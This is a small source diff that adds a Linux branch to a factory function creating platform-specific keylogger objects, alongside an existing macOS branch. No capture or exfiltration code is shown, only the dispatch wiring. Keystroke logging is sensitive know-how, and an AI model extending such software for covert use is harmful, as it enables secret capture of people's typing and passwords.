@@ -16,6 +16,14 @@ IKeylogger* createPlatformKeylogger() {
     return new MacKeylogger();
 }
 
+#elif defined(__linux__)
+
+#include "keylogger_linux.hpp"
+
+IKeylogger* createPlatformKeylogger() {
+    return new LinuxKeylogger();
+}
+
 #else
 
 #include <iostream>
